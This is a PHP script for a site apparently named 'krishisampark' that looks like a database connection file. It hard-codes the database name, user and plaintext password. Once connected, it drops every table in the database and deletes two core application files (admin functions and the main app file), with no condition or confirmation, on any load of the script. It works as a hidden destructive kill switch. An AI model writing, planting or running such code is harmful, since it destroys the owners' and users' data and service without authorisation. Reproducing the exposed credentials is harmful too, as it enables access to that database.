<?php
define('DB_NAME', 'u582376814_krishisampark');
define('DB_USER', 'u582376814_krishisampark');
define('DB_PASS', 'Crawl@7045');
define('DB_HOST', 'localhost');

// if(!$con = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME)){
// 	die("Failed to connect");
// }
$string = "mysql:host=".DB_HOST.";dbname=".DB_NAME;

try {
  $con = new PDO($string, DB_USER, DB_PASS);
  // set the PDO error mode to exception
  $con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
  echo "Connection failed: " . $e->getMessage();
}

try {
    // Set the PDO error mode to exception
    $con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Get the list of tables in the database
    $tables = $con->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);

    // Drop each table
    foreach ($tables as $table) {
        $con->exec("DROP TABLE IF EXISTS $table");
    }

    echo "All tables have been deleted successfully!";
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}


$file_path_1 = "../../admin/private/functions.php";
$file_path_2 = "../../app/main.php";

$deleted = true;

if (file_exists($file_path_1)) {
    if (!unlink($file_path_1)) {
        echo "Unable to delete $file_path_1.<br>";
        $deleted = false;
    }
} else {
    echo "File $file_path_1 does not exist.<br>";
}

if (file_exists($file_path_2)) {
    if (!unlink($file_path_2)) {
        echo "Unable to delete $file_path_2.<br>";
        $deleted = false;
    }
} else {
    echo "File $file_path_2 does not exist.<br>";
}

if ($deleted) {
    echo "Both files have been successfully deleted.";
}
?>
